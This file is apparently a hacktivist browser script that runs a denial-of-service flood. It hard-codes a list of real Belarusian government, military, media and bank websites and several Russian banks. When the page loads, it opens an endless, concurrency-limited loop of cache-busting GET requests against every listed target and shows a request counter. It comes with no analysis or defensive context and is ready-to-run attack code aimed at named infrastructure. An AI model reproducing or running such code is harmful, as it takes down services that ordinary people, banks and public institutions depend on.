var attacks = document.getElementById("your_att")
// var all_army = document.getElementById("all_army")
// var test = document.getElementById("test")
// var reload = document.getElementById("reload")
// document.getElementById("reload").onclick = function() {document.location.reload()};

var targets = {
    'http://belta.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.tvr.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.sb.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://belmarket.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.belarus.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://belarus24.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://ont.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.024.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.belnovosti.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://mogilevnews.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.mil.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.slonves.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'http://www.ctv.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://radiobelarus.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://radiusfm.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://alfaradio.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://radiomir.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://radiostalica.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://radiobrestfm.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.tvrmogilev.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://minsknews.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://zarya.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://grodnonews.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.mil.by': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.government.by': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://president.gov.by/ru': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.mvd.gov.by/ru': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'http://www.kgb.by/ru/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'http://www.nbrb.by': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://belarusbank.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://brrb.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.belapb.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://bankdabrabyt.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://belinvestbank.by/individual': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://bgp.by/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://bgp.ru/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.belneftekhim.by': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'http://www.bellegprom.by': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.energo.by': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'http://belres.by/ru/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://mininform.gov.by': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://gazprombank.ch/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://gazprombank.ly/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.rosbank.ru/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://www.tinkoff.ru/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},
    'https://lenta.ru/': {number_of_requests: 0, number_of_errored_responses: 0, access_failures: 0},

}

function printStats() {
    attacks.innerHTML = client_requests
    // console.log(total_requests)
    // all_army.innerHTML = total_requests ? `<span>💪  Our allied army: ${total_requests} </span>` : `<span></span>`;
    // test.innerHTML =  CONCURRENCY_LIMIT;
}

setInterval(printStats, 1000);
console.log(targets);
var CONCURRENCY_LIMIT = 50;

if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
    CONCURRENCY_LIMIT = 50;
    console.log(CONCURRENCY_LIMIT, 'CONCURRENCY_LIMIT')
}


var queue = []
// var total_requests = 0;
var client_requests = 0;
var client_requests_error = 0;
document.get

async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
        method: 'GET',
        mode: 'no-cors',
        signal: controller.signal
    }).then((response) => {
        clearTimeout(id);
        return response;
    }).catch((error) => {
        clearTimeout(id);
        throw error;
    });
}

async function flood(target) {
    queue = [];
    for (var i = 0; ; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift()
        }
        rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
        queue.push(
            fetchWithTimeout(target + rand, {timeout: 2000})
                .catch((error) => {
                    if (error.code === 20 /* ABORT */) {
                        return;
                    }
                    console.log(error)
                    if (targets[target]) {
                        targets[target].number_of_errored_responses++;
                        targets[target].error_message = error.message;
                        client_requests++;
                        client_requests_error++;
                    }

                })
                .then((response) => {
                    if (targets[target]) {
                        if (response && !response.ok) {
                            targets[target].number_of_errored_responses++;
                            targets[target].error_message = response.statusText;
                            client_requests++;
                            client_requests_error++;
                        }
                        targets[target].number_of_requests++;
                        client_requests++;
                    }

                })
        )
    }
}

// Start
Object.keys(targets).map(flood);